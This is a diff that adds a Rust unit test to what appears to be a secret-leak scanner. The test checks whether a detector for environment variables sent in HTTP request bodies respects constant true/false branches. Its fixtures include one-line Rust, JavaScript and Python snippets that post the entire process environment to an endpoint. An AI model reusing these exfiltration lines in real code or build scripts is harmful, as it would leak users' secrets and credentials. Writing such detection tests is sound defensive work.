@@ -454,3 +454,53 @@ fn execution_facts_survive_the_payload_size_gate() {
         Some(1)
     );
 }
+
+/// Literal-dead branches cannot supply a body, but their `else` branch can.
+#[test]
+fn constant_boolean_branches_preserve_only_the_reachable_payload() {
+    for (file, send) in [
+        (
+            "build.rs",
+            "ureq::post(endpoint).send_json(std::env::vars());",
+        ),
+        (
+            "index.js",
+            "fetch(endpoint,{method:'POST',body:JSON.stringify(process.env)});",
+        ),
+    ] {
+        let function = if file.ends_with("rs") {
+            "fn main()"
+        } else {
+            "function run()"
+        };
+        for (condition, first, second, expected) in [
+            ("false", send, "", false),
+            ("false", "", send, true),
+            ("true", send, "", true),
+            ("true", "", send, false),
+            ("enabled", send, "", true),
+        ] {
+            let source = format!("{function}{{if {condition} {{{first}}} else {{{second}}}}}");
+            let source = if file.ends_with("js") {
+                source.replace(&format!("if {condition}"), &format!("if ({condition})"))
+            } else {
+                source
+            };
+            assert_eq!(
+                kinds(file, &source).contains("environment-http-body"),
+                expected,
+                "{file}: {source}"
+            );
+        }
+    }
+    for (condition, expected) in [("False", false), ("True", true), ("enabled", true)] {
+        let source = format!(
+            "import os\nimport requests\nif {condition}:\n requests.post(endpoint,json=dict(os.environ))\n"
+        );
+        assert_eq!(
+            kinds("a.py", &source).contains("environment-http-body"),
+            expected,
+            "{source}"
+        );
+    }
+}
